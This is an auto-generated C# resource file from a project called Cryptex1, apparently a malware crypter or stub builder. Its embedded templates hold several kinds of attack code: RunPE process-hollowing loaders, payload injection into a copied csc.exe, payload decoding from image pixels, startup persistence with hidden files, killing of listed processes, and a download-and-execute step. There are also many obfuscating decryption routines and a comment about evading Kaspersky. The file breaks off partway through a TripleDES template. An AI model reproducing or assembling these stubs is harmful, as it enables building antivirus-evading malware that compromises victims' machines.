//------------------------------------------------------------------------------
// <auto-generated>
//     Ce code a été généré par un outil.
//     Version du runtime :4.0.30319.239
//
//     Les modifications apportées à ce fichier peuvent provoquer un comportement incorrect et seront perdues si
//     le code est régénéré.
// </auto-generated>
//------------------------------------------------------------------------------

namespace Cryptex1.Properties {
    using System;
    
    
    /// <summary>
    ///   Une classe de ressource fortement typée destinée, entre autres, à la consultation des chaînes localisées.
    /// </summary>
    // Cette classe a été générée automatiquement par la classe StronglyTypedResourceBuilder
    // à l'aide d'un outil, tel que ResGen ou Visual Studio.
    // Pour ajouter ou supprimer un membre, modifiez votre fichier .ResX, puis réexécutez ResGen
    // avec l'option /str ou régénérez votre projet VS.
    [global::System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "4.0.0.0")]
    [global::System.Diagnostics.DebuggerNonUserCodeAttribute()]
    [global::System.Runtime.CompilerServices.CompilerGeneratedAttribute()]
    internal class Resources {
        
        private static global::System.Resources.ResourceManager resourceMan;
        
        private static global::System.Globalization.CultureInfo resourceCulture;
        
        [global::System.Diagnostics.CodeAnalysis.SuppressMessageAttribute("Microsoft.Performance", "CA1811:AvoidUncalledPrivateCode")]
        internal Resources() {
        }
        
        /// <summary>
        ///   Retourne l'instance ResourceManager mise en cache utilisée par cette classe.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Resources.ResourceManager ResourceManager {
            get {
                if (object.ReferenceEquals(resourceMan, null)) {
                    global::System.Resources.ResourceManager temp = new global::System.Resources.ResourceManager("Cryptex1.Properties.Resources", typeof(Resources).Assembly);
                    resourceMan = temp;
                }
                return resourceMan;
            }
        }
        
        /// <summary>
        ///   Remplace la propriété CurrentUICulture du thread actuel pour toutes
        ///   les recherches de ressources à l'aide de cette classe de ressource fortement typée.
        /// </summary>
        [global::System.ComponentModel.EditorBrowsableAttribute(global::System.ComponentModel.EditorBrowsableState.Advanced)]
        internal static global::System.Globalization.CultureInfo Culture {
            get {
                return resourceCulture;
            }
            set {
                resourceCulture = value;
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] AESDecrypt(byte[] input, string Pass)
        ///        {
        ///            System.Security.Cryptography.RijndaelManaged AES = new System.Security.Cryptography.RijndaelManaged();
        ///            byte[] hash = new byte[32];
        ///            byte[] temp = new MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.ASCII.GetBytes(Pass));
        ///            Array.Copy(temp, 0, hash, 0, 16);
        ///            Array.Copy(temp, 0, hash, 15, 16);
        ///            AES.Key = hash;
        ///            AES.Mode = System.Security.Crypto [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string AES {
            get {
                return ResourceManager.GetString("AES", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à [assembly: AssemblyTitle(&quot;[TITLE]&quot;)]
        ///[assembly: AssemblyDescription(&quot;[ASSDESCRIPTION]&quot;)]
        ///[assembly: AssemblyCompany(&quot;[COMPANY]&quot;)]
        ///[assembly: AssemblyProduct(&quot;[PRODUCT]&quot;)]
        ///[assembly: AssemblyCopyright(&quot;[COPYRIGHT]&quot;)]
        ///[assembly: AssemblyVersion(&quot;[MAJOR].[MINOR].[BILD].[REVISION]&quot;)]
        ///[assembly: AssemblyFileVersion(&quot;[MAJOR].[MINOR].[BILD].[REVISION]&quot;)].
        /// </summary>
        internal static string Assemblyinf {
            get {
                return ResourceManager.GetString("Assemblyinf", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à string RPP24 = bAA1BCC1(AJJ8);
        ///byte[] RAA1P3 = Convert.FromBase64String(RPP24);
        /////AA5BB1DD2KK4abc(RAA1P3, &quot;[TYPE-NUMBER]&quot;, &quot;Freaking Kaspersky was acting gay&quot;, true, &quot;story&quot;, &quot;[METHOD-NAME]&quot;, KKKKK1, &quot;[INJECT-INTO]&quot;);
        ///Assembly.Load(RAA1P3).GetType(&quot;[TYPE-NUMBER]&quot;).InvokeMember(&quot;[METHOD-NAME]&quot;, BindingFlags.InvokeMethod, null, null, new object[] {KKKKK1, @injAA3AA2});
        ///.
        /// </summary>
        internal static string AssLoadinv4 {
            get {
                return ResourceManager.GetString("AssLoadinv4", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à //string RPP24 = ;
        /////byte[] RAA1P3 = ;
        /////MessageBox.Show(Assembly.Load(Convert.FromBase64String(bAA1BCC1(AJJ8))).GetTypes()[5].ToString());
        /////Assembly.Load(Convert.FromBase64String(bAA1BCC1(AJJ8))).GetTypes()[5].GetMethod(Encoding.Default.GetString(Convert.FromBase64String(&quot;SW5qZWN0UEU=&quot;))).Invoke(null, new object[] {KKKKK1 , true, &quot;[INJECT-INTO]&quot;, &quot;.exe&quot;, true, false });
        /////Assembly.Load(Convert.FromBase64String(bAA1BCC1(AJJ8))).GetTypes()[5].InvokeMember(Encoding.Default.GetString(Convert.FromBase64Str [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string AssloadNew {
            get {
                return ResourceManager.GetString("AssloadNew", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à ri.WriteLine(&quot;[COMMANDBATCH]&quot;);.
        /// </summary>
        internal static string Batch {
            get {
                return ResourceManager.GetString("Batch", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à ri.Close();
        ///ProcessStartInfo inff = new ProcessStartInfo();
        ///inff.WindowStyle = ProcessWindowStyle.Hidden;
        ///inff.FileName = (Application.LocalUserAppDataPath + &quot;\\run.bat&quot;);
        ///Process.Start(inf);.
        /// </summary>
        internal static string Batch2 {
            get {
                return ResourceManager.GetString("Batch2", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à public static void JJ9KK4BBB2JJ1 (string AA8JJ3BB3CC2, string FF1FF2FF3KK3KK2LL1CC1)
        ///{
        ///string BB1KK3AA1LL3FF3 = Path.GetTempPath() + AA8JJ3BB3CC2;
        ///if(File.Exists(BB1KK3AA1LL3FF3))
        ///{File.Delete(BB1KK3AA1LL3FF3);}
        ///System.IO.File.WriteAllBytes(BB1KK3AA1LL3FF3, (byte[])JJ9.GetObject(FF1FF2FF3KK3KK2LL1CC1));
        ///System.Diagnostics.Process.Start(BB1KK3AA1LL3FF3);
        ///}
        ///.
        /// </summary>
        internal static string BindSource {
            get {
                return ResourceManager.GetString("BindSource", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à public static byte[] CloudDecrypt(byte[] Input, string key)
        ///        {
        ///            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
        ///            byte[] FinVal = new byte[Input.Length];
        ///            short kc = 0;
        ///            for (int index = 0; index &lt; Input.Length; index++)
        ///            {
        ///                if (kc &gt;= Key.Length) kc = 0;
        ///                FinVal[index] = (byte)(Input[index] - (Input.Length % Key.Length) - (Key[kc]));
        ///                kc++;
        ///            }
        ///            return FinVal;
        ///    [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Cloud {
            get {
                return ResourceManager.GetString("Cloud", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à Thread.Sleep([SLEEPVALUE]);.
        /// </summary>
        internal static string Delay {
            get {
                return ResourceManager.GetString("Delay", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à public static byte[] DexDecrypt(byte[] plain, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            for (int round = 4; round &gt;= 0; round--)
        ///            {
        ///                for (int i = 0; i &lt; plain.Length; i++)
        ///                {
        ///                    for (int k = 0; k &lt; key.Length; k++) plain[i] = (byte)(plain[i] ^ ((((key[k] &lt;&lt; round) ^ k) + i)));
        ///                    plain[i] = (byte)(plain[i] ^ key[i % key.Length]);
        ///                }
        ///            }
        ///    [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Dex {
            get {
                return ResourceManager.GetString("Dex", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à string injAA3AA2 = Path.GetTempPath() + &quot;[INJECT-INTO].exe&quot;;
        /////string injAA3AA2 = System.IO.Path.GetDirectoryName(Environment.SystemDirectory) + &quot;\\Microsoft.NET\\Framework\\v2.0.50727\\vbc.exe&quot;;
        ///File.Copy(System.IO.Path.GetDirectoryName(Environment.SystemDirectory) + &quot;\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe&quot;, injAA3AA2,true);
        /////AA1BB6BB2(injAA3AA2, File.ReadAllBytes(System.IO.Path.GetDirectoryName(Environment.SystemDirectory) + &quot;\\Microsoft.NET\\Framework\\v2.0.50727\\csc.exe&quot;));.
        /// </summary>
        internal static string Drop {
            get {
                return ResourceManager.GetString("Drop", resourceCulture);
            }
        }
        
        internal static System.Drawing.Bitmap Enc {
            get {
                object obj = ResourceManager.GetObject("Enc", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à [DECRYPTION]
        ///[DECRYPTION2]
        ///[ANOTHERINJECT]		
        ///[STARTUPCALL]
        ///[RUNPE]
        ///[ACTIVEXVOID].
        /// </summary>
        internal static string EncPic {
            get {
                return ResourceManager.GetString("EncPic", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.[STARTUPFOLDERSHIZ]) + &quot;\\[FILENAMESUP]&quot;, FileAttributes.Hidden);.
        /// </summary>
        internal static string HIDEFILE {
            get {
                return ResourceManager.GetString("HIDEFILE", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à KKKKK1 = [DECRYPT-STRING2]
        ///KKKKK1 = [DECRYPT-STRING];
        ///
        ///.
        /// </summary>
        internal static string ISDOTNET {
            get {
                return ResourceManager.GetString("ISDOTNET", resourceCulture);
            }
        }
        
        internal static System.Drawing.Bitmap main {
            get {
                object obj = ResourceManager.GetObject("main", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à static void Main()
        ///        {		
        ///        try
        ///        {	
        ///		AA2dBBbBB3(&quot;[MUTEXTKEY]&quot;);
        ///		[PROCKILL]		
        ///		[BIND-DROP1] 
        ///		[BATCH1]
        ///		[BATCH2]		
        ///		[ACTIVEXSTART]
        ///		[HIDEFILE]		
        ///		[DOWNLOAD-DROP1]		
        ///		[YES]
        ///	    [DROPLOADER]		
        ///        byte[] KKKKK1 = (byte[])JJ9.GetObject(&quot;[RESNAMESTRING]&quot;);
        ///		[DOTNETORNOT]
        ///		[RUNPE-CALL]	
        ///		[STARTUP]
        ///        [DOWNLOAD-DROP]
        ///        [BIND-DROP2]        
        ///		
        ///        }
        ///        catch(Exception ex) {MessageBox.Show(ex.ToString()); }
        ///        }.
        /// </summary>
        internal static string Mainpic {
            get {
                return ResourceManager.GetString("Mainpic", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à using System;
        ///using System.Net;
        ///using System.IO;
        ///using System.IO.Compression;
        ///using System.Text;
        ///using System.Reflection;
        ///using System.Resources;
        ///using System.Diagnostics;
        ///using System.Security.Cryptography;
        ///using System.Runtime.InteropServices;
        ///using System.Threading;
        ///using System.Windows.Forms;
        ///using System.Drawing;
        ///using System.Drawing.Imaging;
        ///using System.Collections;
        ///using System.Collections.Generic;
        ///using Microsoft.Win32;
        ///
        ///[ASSMBLY]
        ///namespace BB9CC9FF9
        ///{
        ///    class AA1AA2AA4AA4AA2 [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string MAINSOURCE {
            get {
                return ResourceManager.GetString("MAINSOURCE", resourceCulture);
            }
        }
        
        internal static byte[] NewRunPE {
            get {
                object obj = ResourceManager.GetObject("NewRunPE", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à KKKKK1 = [DECRYPT-STRING2]
        ///KKKKK1 = [DECRYPT-STRING];
        ///
        ///.
        /// </summary>
        internal static string NOTNET {
            get {
                return ResourceManager.GetString("NOTNET", resourceCulture);
            }
        }
        
        internal static byte[] nrunpe2 {
            get {
                object obj = ResourceManager.GetObject("nrunpe2", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static System.Drawing.Bitmap other {
            get {
                object obj = ResourceManager.GetObject("other", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à 
        ///public static void AA2dBBbBB3(string mutexkey)
        ///		{
        ///		bool AA8BB63;
        ///        new System.Threading.Mutex(true, mutexkey, out AA8BB63);
        ///        if (!AA8BB63) {Environment.Exit(Environment.ExitCode);};
        ///		}
        ///		 
        ///		[NETCALL]
        ///		private static void AA1()
        ///        {
        ///			[JUNK-CODE]
        ///        }
        ///		[BINDVOID]
        ///        [FAKE-API]
        ///		 public static bool AA1BB6BB2(string _FileName, byte[] _ByteArray)
        ///        {   
        ///         System.IO.FileStream BB24 = new System.IO.FileStream(_FileName, System.IO.FileMode.Create,  [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string OtherPic {
            get {
                return ResourceManager.GetString("OtherPic", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] PolyTripleDESDecrypt(byte[] bytes, string Key)
        ///        {
        ///            byte[] inputArray = bytes;
        ///            TripleDESCryptoServiceProvider tripleDES = new TripleDESCryptoServiceProvider();
        ///            tripleDES.Key = UTF8Encoding.UTF8.GetBytes(Key);
        ///            tripleDES.Mode = CipherMode.ECB;
        ///            tripleDES.Padding = PaddingMode.PKCS7;
        ///            ICryptoTransform cTransform = tripleDES.CreateDecryptor();
        ///            byte[] resultArray = cTransform.TransformFinalBlock(i [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Poly3DES {
            get {
                return ResourceManager.GetString("Poly3DES", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] PolyAESDecrypt(byte[] cipherText, string Key)
        ///        {
        ///            byte[] salt;
        ///            SymmetricAlgorithm algo = new RijndaelManaged();
        ///            algo.Mode = CipherMode.CBC;
        ///            RNGCryptoServiceProvider rngAlgo = new RNGCryptoServiceProvider();
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            byte[] cipherTextWithSalt = new byte[1];
        ///            byte[] encSalt = new byte[1];
        ///            byte[] origCipherText = new byte[1];
        ///         [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string PolyAes {
            get {
                return ResourceManager.GetString("PolyAes", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à public static byte[] PolyBabyDecrypt(byte[] input, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            byte[] Out = new byte[input.Length - 1];
        ///            int x = input[input.Length - 1];
        ///            for (int i = 0; i &lt;= Out.Length - 1; i++) Out[i] = (byte)(input[i] ^ (key[i % key.Length] + x) &amp; 255);
        ///            return Out;
        ///        }.
        /// </summary>
        internal static string PolyBaby {
            get {
                return ResourceManager.GetString("PolyBaby", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à   public static byte[] PolyCloudDecrypt(byte[] Input, string key)
        ///        {
        ///            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
        ///            int Salt = (int)Input[Input.Length - 1];
        ///            byte[] FinVal = new byte[Input.Length - 1];
        ///            short kc = 0;
        ///            for (int index = 0; index &lt; Input.Length - 1; index++)
        ///            {
        ///                if (kc &gt;= Key.Length) kc = 0;
        ///                if (index &gt;= Input.Length - 1) continue;
        ///                FinVal[index] = (byte)(I [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Polycloud {
            get {
                return ResourceManager.GetString("Polycloud", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] PolyDESDecrypt(byte[] bytes, string Key)
        ///        {
        ///            byte[] inputArray = bytes;
        ///            DESCryptoServiceProvider DES = new DESCryptoServiceProvider();
        ///            DES.Key = UTF8Encoding.UTF8.GetBytes(Key);
        ///            DES.Mode = CipherMode.ECB;
        ///            DES.Padding = PaddingMode.PKCS7;
        ///            ICryptoTransform cTransform = DES.CreateDecryptor();
        ///            byte[] resultArray = cTransform.TransformFinalBlock(inputArray, 0, inputArray.Length);
        ///            D [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string PolyDES {
            get {
                return ResourceManager.GetString("PolyDES", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à public static byte[] PolyDexDecrypt(byte[] plain, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            byte[] expandedKey;
        ///            byte[] dKey = key;
        ///            int length = plain.Length;
        ///            if (dKey.Length &gt;= length) expandedKey = dKey;
        ///            else
        ///            {
        ///                byte[] rconst = BitConverter.GetBytes(Math.Round(Math.PI, 3));
        ///                byte[] result = new byte[length];
        ///                Buffer.BlockCopy(dKey, 0, [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string PolyDex {
            get {
                return ResourceManager.GetString("PolyDex", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] PolyRC2Decrypt(byte[] bytes, string Key)
        ///        {
        ///            byte[] byteKey = Encoding.ASCII.GetBytes(Key);
        ///            byte[] byteIV = byteKey;
        ///            MemoryStream MS = new MemoryStream();
        ///            RC2CryptoServiceProvider RC2 = new RC2CryptoServiceProvider();
        ///            CryptoStream CS = new CryptoStream(MS, RC2.CreateDecryptor(byteKey, byteIV), CryptoStreamMode.Write);
        ///            CS.Write(bytes, 0, bytes.Length);
        ///            CS.FlushFinalBlock();
        ///            byt [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string PolyRC2 {
            get {
                return ResourceManager.GetString("PolyRC2", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à public static byte[] PolyRevDecrypt (byte[] data, string pass)
        ///        {
        ///            Array.Reverse(data);
        ///            byte rndByte = data[data.Length - 1];
        ///            byte[] passByte = System.Text.Encoding.ASCII.GetBytes(pass);
        ///            byte[] Out = new byte[data.Length + 1];
        ///            int u = 0;
        ///            for (int i = 0; i &lt;= data.Length - 1; i++)
        ///            {
        ///                Out[i] = (byte)((data[i] ^ rndByte) ^ passByte[u]);
        ///                Array.Reverse(passByte);
        ///                if  [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string PolyRev {
            get {
                return ResourceManager.GetString("PolyRev", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] PolyRijndaelDecrypt(byte[] bytes, string Key)
        ///        {
        ///            Rijndael rijndael = Rijndael.Create();
        ///            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(Key,
        ///                new byte[] { 0x26, 0xdc, 0xff, 0x00, 0xad, 0xed, 0x7a, 0xee, 0xc5, 0xfe, 0x07, 0xaf, 0x4d, 0x08, 0x22, 0x3c });
        ///            rijndael.Key = pdb.GetBytes(32);
        ///            rijndael.IV = pdb.GetBytes(16);
        ///            MemoryStream memoryStream = new MemoryStream();
        ///            CryptoStream cryptoSt [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string PolyRijn {
            get {
                return ResourceManager.GetString("PolyRijn", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] PolyStairDeCrypt(byte[] Data, string key)
        ///        {
        ///            byte[] Key = System.Text.Encoding.ASCII.GetBytes(key);
        ///            for (int i = 0; i &lt;= Data.Length; i++)
        ///            {
        ///                Data[i % Data.Length] = Convert.ToByte((Convert.ToInt32(Data[i % Data.Length] ^ Key[i % Key.Length]) - Convert.ToInt32(Data[(i + 1) % Data.Length]) + 256) % 256);
        ///            }
        ///            Array.Resize(ref Data, Data.Length - 1);
        ///            return Data;
        ///        }.
        /// </summary>
        internal static string PolyStairs {
            get {
                return ResourceManager.GetString("PolyStairs", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] PolySymetricDecrypt(byte[] bytes, string Key)
        ///        {
        ///            MemoryStream ms = new MemoryStream();
        ///            System.Security.Cryptography.SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
        ///            byte[] key = Encoding.ASCII.GetBytes(Key);
        ///            byte[] rgbIV = key;
        ///            CryptoStream cs = new CryptoStream(ms, rijn.CreateDecryptor(key, rgbIV), CryptoStreamMode.Write);
        ///            cs.Write(bytes, 0, bytes.Length);
        ///            cs.Close();
        ///             [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string PolySym {
            get {
                return ResourceManager.GetString("PolySym", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à foreach (System.Diagnostics.Process pr in System.Diagnostics.Process.GetProcesses())       
        ///       {
        ///         if (L.Contains(pr.ProcessName.ToLower())) pr.Kill();
        ///       }.
        /// </summary>
        internal static string Prockill {
            get {
                return ResourceManager.GetString("Prockill", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à         public static byte[] RC2Decrypt(byte[] bytes, string IV, string Key)
        ///        {
        ///                byte[] byteKey = Encoding.ASCII.GetBytes(Key);
        ///                byte[] byteIV = Encoding.ASCII.GetBytes(IV);
        ///                MemoryStream MS = new MemoryStream();
        ///                RC2CryptoServiceProvider RC2 = new RC2CryptoServiceProvider();
        ///                CryptoStream CS = new CryptoStream(MS, RC2.CreateDecryptor(byteKey, byteIV), CryptoStreamMode.Write);
        ///                CS.Write(bytes, 0, bytes.Le [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string RC2 {
            get {
                return ResourceManager.GetString("RC2", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à     public static byte[] RC4(byte[] bytes, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            Byte[] s = new Byte[256];
        ///            Byte[] k = new Byte[256];
        ///            Byte temp;
        ///            int i, j;
        ///
        ///            for (i = 0; i &lt; 256; i++)
        ///            {
        ///                s[i] = (Byte)i;
        ///                k[i] = key[i % key.GetLength(0)];
        ///            }
        ///
        ///            j = 0;
        ///            for (i = 0; i &lt; 256; i++)
        ///            {
        ///                j = ( [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string RC4 {
            get {
                return ResourceManager.GetString("RC4", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à         public static byte[] RijndaelDecrypt(byte[] cipher, string password)
        ///        {
        ///            Rijndael rijndael = Rijndael.Create();
        ///            Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(password, 
        ///                new byte[] { 0x26, 0xdc, 0xff, 0x00, 0xad, 0xed, 0x7a, 0xee, 0xc5, 0xfe, 0x07, 0xaf, 0x4d, 0x08, 0x22, 0x3c });
        ///            rijndael.Key = pdb.GetBytes(32);
        ///            rijndael.IV = pdb.GetBytes(16);
        ///            MemoryStream memoryStream = new MemoryStream();
        ///            Crypto [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Rijindael {
            get {
                return ResourceManager.GetString("Rijindael", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à public byte[] RSMDecrypt(byte[] data, byte[] key)
        ///        {
        ///            Rfc2898DeriveBytes R = new Rfc2898DeriveBytes(key, new byte[8], 1);
        ///
        ///            RijndaelManaged T = new RijndaelManaged();
        ///            T.Key = R.GetBytes(16);
        ///            T.IV = R.GetBytes(16);
        ///
        ///            byte[] O = T.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
        ///            byte[] U = new byte[O.Length - 16];
        ///            Buffer.BlockCopy(O, 16, U, 0, O.Length - 16);
        ///
        ///            return U;
        ///        }.
        /// </summary>
        internal static string RSM {
            get {
                return ResourceManager.GetString("RSM", resourceCulture);
            }
        }
        
        internal static System.Drawing.Bitmap runpe {
            get {
                object obj = ResourceManager.GetObject("runpe", resourceCulture);
                return ((System.Drawing.Bitmap)(obj));
            }
        }
        
        internal static byte[] RunPE0 {
            get {
                object obj = ResourceManager.GetObject("RunPE0", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPe2 {
            get {
                object obj = ResourceManager.GetObject("RunPe2", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPe3 {
            get {
                object obj = ResourceManager.GetObject("RunPe3", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        internal static byte[] RunPe7 {
            get {
                object obj = ResourceManager.GetObject("RunPe7", resourceCulture);
                return ((byte[])(obj));
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à 		 public static string bAA1BCC1(Image a)
        ///        {
        ///            string retrievestr = &quot;&quot;;
        ///            int xmax = 0;
        ///            int ymax = 0;
        ///            xmax = a.Width - 1;
        ///            ymax = a.Height - 1;
        ///            for (int y = 1; y &lt;= ymax; y++)
        ///            {
        ///                for (int x = 1; x &lt;= xmax; x++)
        ///                {
        ///                    System.Drawing.Color _with1 = new System.Drawing.Color();
        ///                    _with1 = ((Bitmap)a).GetPixel(x, y);                                           /// [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Runpepic {
            get {
                return ResourceManager.GetString("Runpepic", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à JJ7.DownloadFile(&quot;{ADDRESS}&quot;, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + &quot;\\{FILENAME}&quot;);
        ///Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.[SINGLEDLDROPPLACE]) + &quot;\\{FILENAME}&quot;);
        ///.
        /// </summary>
        internal static string SingleDL {
            get {
                return ResourceManager.GetString("SingleDL", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à using System;
        ///using System.Text;
        ///using System.Threading;
        ///using System.Resources;
        ///using System.Reflection;
        ///using System.IO;
        ///using System.Windows.Forms;
        ///using System.Security.Cryptography;
        ///[ASSMBLY]
        ///namespace BB9CC9FF9
        ///{
        ///    class AA1AA2AA4AA4AA2BB3CC1AA2DD3KK3KK5FF2
        ///    {
        ///	public static ResourceManager JJ9 = new ResourceManager(&quot;[RESNAME2X]&quot;, System.Reflection.Assembly.GetExecutingAssembly());
        ///	static void Main()
        ///        {		
        ///        try
        ///        {	
        ///		string AA2KK2st = Path.GetTempPath() + &quot;l [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Source2 {
            get {
                return ResourceManager.GetString("Source2", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à  public static byte[] StairsDecrypt(byte[] Data, string Key)
        ///        {
        ///            byte[] key = System.Text.Encoding.ASCII.GetBytes(Key);
        ///            for (int i = (Data.Length * 2) + key.Length; i &gt;= 0; i += -1)
        ///            {
        ///                Data[i % Data.Length] = (byte)(((int)(Data[i % Data.Length] ^ key[i % key.Length]) - (int)(Data[(i + 1) % Data.Length]) + 256) % 256);
        ///            }
        ///            return Data;
        ///        }.
        /// </summary>
        internal static string Stairs {
            get {
                return ResourceManager.GetString("Stairs", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à static void fAdsfinDD1CC4A1(string KK9KK7JJ4JJ3, [Optional, DefaultParameterValue(true)] bool AA2AA4AA6AA4AA4 )
        ///{
        ///string AA1AA3KK4KK2JJ3;
        ///string AA2KK2st = Path.GetTempPath() + &quot;loc.txt&quot;;
        ///if(File.Exists(AA2KK2st))
        ///{
        ///AA1AA3KK4KK2JJ3 = File.ReadAllText(AA2KK2st);
        ///File.Delete(AA2KK2st);
        ///}
        ///else {AA1AA3KK4KK2JJ3 =System.Reflection.Assembly.GetExecutingAssembly().Location;}
        ///string zzAA3AA1 = Path.GetTempPath() + &quot;[FILENAMESUP]&quot;;
        ///if(AA2AA4AA6AA4AA4)
        ///{
        /////AA1BB6BB2(zzAA3AA1, File.ReadAllBytes(AA1AA3KK4K [le reste de la chaîne a été tronqué]&quot;;.
        /// </summary>
        internal static string Startup {
            get {
                return ResourceManager.GetString("Startup", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à        public static byte[] SymetricDecrypt(byte[] bytes, string Key)
        ///  {
        ///    MemoryStream ms = new MemoryStream();
        ///    System.Security.Cryptography.SymmetricAlgorithm rijn = SymmetricAlgorithm.Create();
        ///    byte[] key = Encoding.ASCII.GetBytes(Key);
        ///    byte[] rgbIV = key;
        ///    CryptoStream cs = new CryptoStream(ms, rijn.CreateDecryptor(key, rgbIV), CryptoStreamMode.Write);
        ///    cs.Write(bytes, 0, bytes.Length);
        ///    cs.Close();
        ///    return ms.ToArray();
        ///  } .
        /// </summary>
        internal static string Symetric {
            get {
                return ResourceManager.GetString("Symetric", resourceCulture);
            }
        }
        
        /// <summary>
        ///   Recherche une chaîne localisée semblable à 			public static byte[] TripleDESDecrypt(byte[] bytes, string Key)
        ///         {
        ///             byte[] inputArray = bytes;
